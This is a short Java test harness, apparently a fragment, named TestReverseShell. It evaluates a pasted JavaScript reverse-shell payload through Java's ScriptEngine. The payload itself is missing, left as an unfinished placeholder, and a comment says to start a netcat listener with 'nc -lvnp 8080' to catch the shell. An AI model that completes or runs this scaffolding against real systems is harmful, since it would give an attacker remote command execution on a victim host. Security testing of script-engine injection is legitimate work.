import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

public class TestReverseShell {
    public static void main(String[] args) throws Exception {
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");

        // Start a local listener first!
        // Run in terminal: nc -lvnp 8080

        String script = // paste the JS above here as a string

        engine.eval(script);
    }
}
